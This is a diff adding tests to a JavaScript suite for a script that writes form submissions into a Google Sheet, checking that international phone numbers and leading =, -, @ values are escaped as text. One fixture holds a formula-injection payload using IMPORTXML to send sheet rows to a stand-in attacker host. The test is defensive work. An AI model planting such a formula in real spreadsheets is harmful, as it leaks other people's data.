@@ -190,6 +190,46 @@ const asObject = (headers, row) => Object.fromEntries(headers.map((h, i) => [h, 
   check("4f unknown tool does not appear anywhere", odd["All Tools"] === "Nope" && odd["Tools Count"] === 1)
 }
 
+/* ── 4b. Formula injection and phone numbers ────────────────────────────── */
+{
+  const { sandbox, sheet } = run([])
+  sandbox.setupSheet()
+
+  post(sandbox, {
+    ...PAYLOAD,
+    profile: {
+      ...PAYLOAD.profile,
+      // The real-world case: an international number starts with "+", which
+      // Sheets parses as a formula and renders as #ERROR!, losing the number.
+      phone: "+55 11 90000-0000",
+      // The dangerous case: a formula that would run when a teammate opens the
+      // sheet and post other rows to an attacker.
+      fullName: '=IMPORTXML("https://attacker.example/?"&A2,"//a")',
+      links: "-nothing yet",
+      location: "@home"
+    }
+  })
+  const row = asObject(sheet._grid[0], sheet._grid[1])
+
+  check("4b1 a +country-code phone is stored as text, not #ERROR!",
+    row["Phone / WhatsApp"] === "'+55 11 90000-0000", JSON.stringify(row["Phone / WhatsApp"]))
+  check("4b2 a formula in a text field is neutralised",
+    row["Full Name"].startsWith("'="), JSON.stringify(row["Full Name"]).slice(0, 60))
+  check("4b3 leading - is escaped", row["Additional Links"] === "'-nothing yet")
+  check("4b4 leading @ is escaped", row["Location"] === "'@home")
+  check("4b5 ordinary text is left alone", row["Email"] === "ana@exemplo.com",
+    JSON.stringify(row["Email"]))
+  check("4b6 numbers are not turned into strings",
+    row["Practice Count"] === 3 && typeof row["Practice Count"] === "number")
+  check("4b7 the timestamp is still a Date",
+    Object.prototype.toString.call(row["Received At"]) === "[object Date]")
+  // Text columns keep the default format on purpose: a plain-text ("@") cell
+  // skips Sheets' input parsing, which is what strips the escaping apostrophe.
+  check("4b8 text columns keep the default format, so the apostrophe stays invisible",
+    sheet._calls.formats[sheet._grid[0].indexOf("Full Name") + 1] === undefined,
+    String(sheet._calls.formats[sheet._grid[0].indexOf("Full Name") + 1]))
+}
+
 /* ── 5. Columns reordered by hand in Sheets ─────────────────────────────── */
 {
   const { sandbox: probe } = run([])
